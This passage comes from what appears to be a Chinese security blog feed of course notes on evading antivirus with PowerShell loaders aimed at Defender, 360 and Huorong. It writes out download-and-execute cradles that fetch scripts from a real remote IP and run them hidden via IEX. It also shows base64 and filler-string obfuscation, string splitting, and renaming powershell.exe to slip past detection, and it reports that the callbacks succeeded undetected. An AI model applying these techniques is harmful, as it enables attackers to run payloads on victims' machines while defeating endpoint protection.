alt="image-20230502195050720"></p><h6 id="go-build-ldflags-“-s-w-H-x3D-windowsgui”-5-go（无弹窗）"><a href="#go-build-ldflags-“-s-w-H-x3D-windowsgui”-5-go（无弹窗）" class="headerlink" title="go build -ldflags “-s -w -H&#x3D;windowsgui” 5.go（无弹窗）"></a>go build -ldflags “-s -w -H&#x3D;windowsgui” 5.go（无弹窗）</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502194748743.png" alt="image-20230502194748743"></p><h5 id="4、Golang-保护混淆反调试器-通用"><a href="#4、Golang-保护混淆反调试器-通用" class="headerlink" title="4、Golang-保护混淆反调试器-通用"></a>4、Golang-保护混淆反调试器-通用</h5><h6 id="SafengineShielden"><a href="#SafengineShielden" class="headerlink" title="SafengineShielden"></a>SafengineShielden</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502200259376.png" alt="image-20230502200259376"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day109 免杀对抗-PowerShell&amp;混淆&amp;分离加载&amp;特征修改&amp;EXE生成&amp;填充替换</title>
      <link href="/2023/04/27/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/"/>
      <url>/2023/04/27/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Powershell-对变量数据做文章</p><p>2、Powershell-对Shellcode做文章</p><p>3、Powershell-对执行代码特征做文章</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h3 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h3><p>X60 Defender 某绒 管家 VT等</p><h3 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h3><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h3 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h3><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-PowerShell-文件模式-混淆过某绒"><a href="#➢-PowerShell-文件模式-混淆过某绒" class="headerlink" title="➢ PowerShell-文件模式-混淆过某绒"></a>➢ PowerShell-文件模式-混淆过某绒</h4><h4 id="➢-PowerShell-文件模式-分离过某60"><a href="#➢-PowerShell-文件模式-分离过某60" class="headerlink" title="➢ PowerShell-文件模式-分离过某60"></a>➢ PowerShell-文件模式-分离过某60</h4><h4 id="➢-PowerShell-文件模式-特征修改过DF"><a href="#➢-PowerShell-文件模式-特征修改过DF" class="headerlink" title="➢ PowerShell-文件模式-特征修改过DF"></a>➢ PowerShell-文件模式-特征修改过DF</h4><h4 id="➢-PowerShell-EXE模式-Ladon-amp-Win-PS2"><a href="#➢-PowerShell-EXE模式-Ladon-amp-Win-PS2" class="headerlink" title="➢ PowerShell-EXE模式-Ladon&amp;Win-PS2"></a>➢ PowerShell-EXE模式-Ladon&amp;Win-PS2</h4><h4 id="➢-PowerShell-命令模式-加载-amp-替换-amp-填充等"><a href="#➢-PowerShell-命令模式-加载-amp-替换-amp-填充等" class="headerlink" title="➢ PowerShell-命令模式-加载&amp;替换&amp;填充等"></a>➢ PowerShell-命令模式-加载&amp;替换&amp;填充等</h4></blockquote><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151636422.png" alt="image-20230430151636422"></p><h6 id="文件模式内容："><a href="#文件模式内容：" class="headerlink" title="文件模式内容："></a>文件模式内容：</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151359510.png" alt="image-20230430151359510"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430151746979.png" alt="image-20230430151746979"></p><h3 id="PowerShell-文件模式-混淆过某绒"><a href="#PowerShell-文件模式-混淆过某绒" class="headerlink" title="#PowerShell-文件模式-混淆过某绒"></a>#PowerShell-文件模式-混淆过某绒</h3><h5 id="1、手工混淆：变量进行编码后解码"><a href="#1、手工混淆：变量进行编码后解码" class="headerlink" title="1、手工混淆：变量进行编码后解码"></a>1、手工混淆：变量进行编码后解码</h5><h5 id="bb-x3D-System-Text-Encoding-ASCII-GetString-System-Convert-FromBase64String-x"><a href="#bb-x3D-System-Text-Encoding-ASCII-GetString-System-Convert-FromBase64String-x" class="headerlink" title="$bb&#x3D;[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($x))"></a>$bb&#x3D;[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($x))</h5><h5 id="powershell-ExecutionPolicy-bypass-File-hr-ps1"><a href="#powershell-ExecutionPolicy-bypass-File-hr-ps1" class="headerlink" title="powershell -ExecutionPolicy bypass -File hr.ps1"></a>powershell -ExecutionPolicy bypass -File hr.ps1</h5><h6 id="将执行上线的代码base64加密"><a href="#将执行上线的代码base64加密" class="headerlink" title="将执行上线的代码base64加密"></a>将执行上线的代码base64加密</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430153852001.png" alt="image-20230430153852001"></p><h6 id="加密后放进去，进行解密"><a href="#加密后放进去，进行解密" class="headerlink" title="加密后放进去，进行解密"></a>加密后放进去，进行解密</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430153827645.png" alt="image-20230430153827645"></p><h6 id="发现不会被查杀"><a href="#发现不会被查杀" class="headerlink" title="发现不会被查杀"></a>发现不会被查杀</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154033273.png" alt="image-20230430154033273"></p><h5 id="2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）"><a href="#2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）" class="headerlink" title="2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）"></a>2、项目混淆：Invoke-Obfuscation（过不了杀软，因为工具有特征）</h5><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430162012079.png" alt="image-20230430162012079"></p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><ul><li>加载模块：Import-Module .&#x2F;Invoke-Obfuscation.psd1</li><li>运行程序：Invoke-Obfuscation</li><li>处理文件：set scriptpath C:\Users\86135\Desktop\1.ps1</li><li>处理代码：set scriptblock ‘xxxx’  （处理某个地方的代码，不需要则不用输入这个命令）</li><li>进入编码：encoding</li><li><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430161718165.png" alt="image-20230430161718165"></li><li>选择编码：1-8</li><li>输出文件：out C:\Users\86135\Desktop\11.ps1  （输出为指定文件）</li></ul><h6 id="在编码后的内容加入其他字母混淆"><a href="#在编码后的内容加入其他字母混淆" class="headerlink" title="在编码后的内容加入其他字母混淆"></a>在编码后的内容加入其他字母混淆</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154426457.png" alt="image-20230430154426457"></p><h6 id="加入后是无法进行base64-解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行"><a href="#加入后是无法进行base64-解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行" class="headerlink" title="加入后是无法进行base64 解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行"></a>加入后是无法进行base64 解码的，所以要进行还原，将base64加密后的代码加上其他代码，xiaodisec，插入其中，然后将xiaodisec进行替换成空后执行</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430154836782.png" alt="image-20230430154836782"></p><h6 id="能过x绒，但是还是无法过x60的"><a href="#能过x绒，但是还是无法过x60的" class="headerlink" title="能过x绒，但是还是无法过x60的"></a>能过x绒，但是还是无法过x60的</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430155422780.png" alt="image-20230430155422780"></p><h6 id="在原型-未加密-的代码中插入字符串，再进行编码"><a href="#在原型-未加密-的代码中插入字符串，再进行编码" class="headerlink" title="在原型(未加密)的代码中插入字符串，再进行编码"></a>在原型(未加密)的代码中插入字符串，再进行编码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430155615622.png" alt="image-20230430155615622"></p><h6 id="解码后，在执行处将其替换为空还原代码"><a href="#解码后，在执行处将其替换为空还原代码" class="headerlink" title="解码后，在执行处将其替换为空还原代码"></a>解码后，在执行处将其替换为空还原代码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160113562.png" alt="image-20230430160113562"></p><h6 id="还是无法过x60"><a href="#还是无法过x60" class="headerlink" title="还是无法过x60"></a>还是无法过x60</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160145157.png" alt="image-20230430160145157"></p><h3 id="PowerShell-文件模式-分离过某60"><a href="#PowerShell-文件模式-分离过某60" class="headerlink" title="#PowerShell-文件模式-分离过某60"></a>#PowerShell-文件模式-分离过某60</h3><blockquote><h5 id="混淆无文件："><a href="#混淆无文件：" class="headerlink" title="混淆无文件："></a>混淆无文件：</h5><h5 id="无文件："><a href="#无文件：" class="headerlink" title="无文件："></a>无文件：</h5><p>$d&#x3D; ((New-Object System.Net.Webclient).DownloadString(‘<a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>‘))</p><h5 id="解码："><a href="#解码：" class="headerlink" title="解码："></a>解码：</h5><p>$x&#x3D;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))</p><p><a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>  &#x3D;  $d base64数据</p><p>$d&#x3D; ((New-Object System.Net.Webclient).DownloadString(‘<a href="http://47.94.236.117/1.txt">http://47.94.236.117/1.txt</a>‘))</p><p>$x&#x3D;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))</p></blockquote><h6 id="将上线文件base64编码放到远程服务器保存为1-txt，将查杀文件分离出去"><a href="#将上线文件base64编码放到远程服务器保存为1-txt，将查杀文件分离出去" class="headerlink" title="将上线文件base64编码放到远程服务器保存为1.txt，将查杀文件分离出去"></a>将上线文件base64编码放到远程服务器保存为1.txt，将查杀文件分离出去</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230501172705835.png" alt="image-20230501172705835"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160424943.png" alt="image-20230430160424943"></p><h6 id="执行文件里面加载远程的上线代码"><a href="#执行文件里面加载远程的上线代码" class="headerlink" title="执行文件里面加载远程的上线代码"></a>执行文件里面加载远程的上线代码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430160927672.png" alt="image-20230430160927672"></p><h6 id="可过x60，但是无法过DF"><a href="#可过x60，但是无法过DF" class="headerlink" title="可过x60，但是无法过DF"></a>可过x60，但是无法过DF</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430161359782.png" alt="image-20230430161359782"></p><h3 id="PowerShell-文件模式-特征修改过DF"><a href="#PowerShell-文件模式-特征修改过DF" class="headerlink" title="#PowerShell-文件模式-特征修改过DF"></a>#PowerShell-文件模式-特征修改过DF</h3><p>Fuzz DF查杀特征</p><h5 id="1、Shellcode换格式"><a href="#1、Shellcode换格式" class="headerlink" title="1、Shellcode换格式"></a>1、Shellcode换格式</h5><h5 id="2、变量名-amp-函数名全修改"><a href="#2、变量名-amp-函数名全修改" class="headerlink" title="2、变量名&amp;函数名全修改"></a>2、变量名&amp;函数名全修改</h5><h6 id="base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单"><a href="#base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单" class="headerlink" title="base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单"></a>base64，混淆编码，用powershell的上线代码无论怎么换编码都无法过DF，因为他们都属微软产品，想查杀十分简单</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430162417120.png" alt="image-20230430162417120"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430164544923.png" alt="image-20230430164544923"></p><h6 id="所以只能在代码中进行修改了"><a href="#所以只能在代码中进行修改了" class="headerlink" title="所以只能在代码中进行修改了"></a>所以只能在代码中进行修改了</h6><h6 id="将这里面的执行的函数都进行更改"><a href="#将这里面的执行的函数都进行更改" class="headerlink" title="将这里面的执行的函数都进行更改"></a>将这里面的执行的函数都进行更改</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430164723195.png" alt="image-20230430164723195"></p><h6 id="用到脚本，将上面base64编码的内容再次bit流编码"><a href="#用到脚本，将上面base64编码的内容再次bit流编码" class="headerlink" title="用到脚本，将上面base64编码的内容再次bit流编码"></a>用到脚本，将上面base64编码的内容再次bit流编码</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430165625116.png" alt="image-20230430165625116"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430170016846.png" alt="image-20230430170016846"></p><h6 id="再替换函数和方法名"><a href="#再替换函数和方法名" class="headerlink" title="再替换函数和方法名"></a>再替换函数和方法名</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430171527285.png" alt="image-20230430171527285"></p><h6 id="此处的-Dolt也替换一下"><a href="#此处的-Dolt也替换一下" class="headerlink" title="此处的$Dolt也替换一下"></a>此处的$Dolt也替换一下</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172123808.png" alt="image-20230430172123808"></p><h6 id="执行上线成功，没有被杀"><a href="#执行上线成功，没有被杀" class="headerlink" title="执行上线成功，没有被杀"></a>执行上线成功，没有被杀</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172210902.png" alt="image-20230430172210902"></p><h3 id="PowerShell-EXE模式-Ladon-amp-Win-PS2"><a href="#PowerShell-EXE模式-Ladon-amp-Win-PS2" class="headerlink" title="#PowerShell-EXE模式-Ladon&amp;Win-PS2"></a>#PowerShell-EXE模式-Ladon&amp;Win-PS2</h3><h6 id="1、GUI-X工具箱内置Ladon"><a href="#1、GUI-X工具箱内置Ladon" class="headerlink" title="1、GUI-X工具箱内置Ladon"></a>1、GUI-X工具箱内置Ladon</h6><h6 id="默认生成tmp-exe，能过x绒"><a href="#默认生成tmp-exe，能过x绒" class="headerlink" title="默认生成tmp.exe，能过x绒"></a>默认生成tmp.exe，能过x绒</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430192632768.png" alt="image-20230430192632768"></p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430193130084.png" alt="image-20230430193130084"></p><h6 id="2、Win-PS2EXE：https-github-com-MScholtes-Win-PS2EXE（过x60还是有点费劲）"><a href="#2、Win-PS2EXE：https-github-com-MScholtes-Win-PS2EXE（过x60还是有点费劲）" class="headerlink" title="2、Win-PS2EXE：https://github.com/MScholtes/Win-PS2EXE（过x60还是有点费劲）"></a>2、Win-PS2EXE：<a href="https://github.com/MScholtes/Win-PS2EXE%EF%BC%88%E8%BF%87x60%E8%BF%98%E6%98%AF%E6%9C%89%E7%82%B9%E8%B4%B9%E5%8A%B2%EF%BC%89">https://github.com/MScholtes/Win-PS2EXE（过x60还是有点费劲）</a></h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430193547974.png" alt="image-20230430193547974"></p><h3 id="PowerShell-命令模式-加载-amp-替换-amp-填充等"><a href="#PowerShell-命令模式-加载-amp-替换-amp-填充等" class="headerlink" title="#PowerShell-命令模式-加载&amp;替换&amp;填充等"></a>#PowerShell-命令模式-加载&amp;替换&amp;填充等</h3><h5 id="1、原型：（拦截）"><a href="#1、原型：（拦截）" class="headerlink" title="1、原型：（拦截）"></a>1、原型：（拦截）</h5><p>powershell -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://47.94.236.117/x.ps1">http://47.94.236.117/x.ps1</a>‘))”</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172722329.png" alt="image-20230430172722329"></p><h5 id="2、替换文件名：（可绕过）"><a href="#2、替换文件名：（可绕过）" class="headerlink" title="2、替换文件名：（可绕过）"></a>2、替换文件名：（可绕过）</h5><h6 id="原本执行：（会拦截）"><a href="#原本执行：（会拦截）" class="headerlink" title="原本执行：（会拦截）"></a>原本执行：（会拦截）</h6><ul><li>powershell “$a&#x3D;’IEX((New-Object Net.WebClient).DownloadString(‘’ht’;$b&#x3D;’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’’));’;IEX ($a+$b)”</li></ul><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430173950151.png" alt="image-20230430173950151"></p><h6 id="将powershell程序改名-可绕过"><a href="#将powershell程序改名-可绕过" class="headerlink" title="将powershell程序改名 (可绕过)"></a>将powershell程序改名 (可绕过)</h6><ul><li><p>copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe</p></li><li><p>.\bypass.exe “$a&#x3D;’IEX((New-Object 